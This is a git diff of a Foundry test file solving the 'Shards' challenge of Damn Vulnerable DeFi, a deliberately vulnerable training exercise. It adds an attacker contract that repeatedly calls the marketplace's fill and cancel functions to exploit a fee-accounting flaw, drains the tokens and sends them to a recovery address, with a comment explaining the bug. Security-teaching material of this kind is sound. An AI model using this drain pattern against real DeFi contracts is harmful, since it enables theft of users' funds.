@@ -12,6 +12,29 @@ import {
 } from "../../src/shards/ShardsNFTMarketplace.sol";
 import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";
 
+
+contract Atttacker{
+    ShardsNFTMarketplace public marketplace;
+    DamnValuableToken public token;
+    address public recovery;
+    constructor(ShardsNFTMarketplace _marketplace, DamnValuableToken _token, address _recovery){
+        marketplace = _marketplace;
+        token = _token;
+        recovery = _recovery;
+        token.approve(address(marketplace), type(uint256).max);
+    }
+    function attack() external {
+        for(uint i =0; i< 10000; i++){
+            uint index =  marketplace.fill(1, 133);
+            marketplace.cancel(1,index);
+        }
+
+        token.transfer(recovery, token.balanceOf(address(this)));
+
+    }
+     
+}
+
 contract ShardsChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -42,7 +65,7 @@ contract ShardsChallenge is Test {
         vm.stopPrank();
         _isSolved();
     }
-
+ 
     /**
      * SETS UP CHALLENGE - DO NOT TOUCH
      */
@@ -82,7 +105,7 @@ contract ShardsChallenge is Test {
         for (uint256 id = 0; id < SELLER_NFT_BALANCE; id++) {
             marketplace.openOffer({nftId: id, totalShards: NFT_OFFER_SHARDS, price: NFT_OFFER_PRICE});
         }
-
+        
         initialTokensInMarketplace = token.balanceOf(address(marketplace));
 
         vm.stopPrank();
@@ -111,10 +134,21 @@ contract ShardsChallenge is Test {
     }
 
     /**
-     * CODE YOUR SOLUTION HERE
+        The marketplace contract has a vulnerability in its fill and cancel functions that allows an attacker to exploit
+        the system by repeatedly filling and canceling offers. This creates a situation where the marketplace's
+        internal accounting of fees becomes inconsistent with the actual token balance held by the contract.
+        By executing a large number of fill and cancel operations in a loop, the attacker can manipulate
+        the marketplace's fee accounting to create a discrepancy between the recorded fees and the actual
+        token balance. This discrepancy can then be exploited to drain tokens from the marketplace.
      */
     function test_shards() public checkSolvedByPlayer {
+      
+        //Deploy the attack contract
+        Atttacker attacker = new Atttacker(marketplace, token, recovery);
         
+        //Start the attack
+        attacker.attack();
+
     }
 
     /**
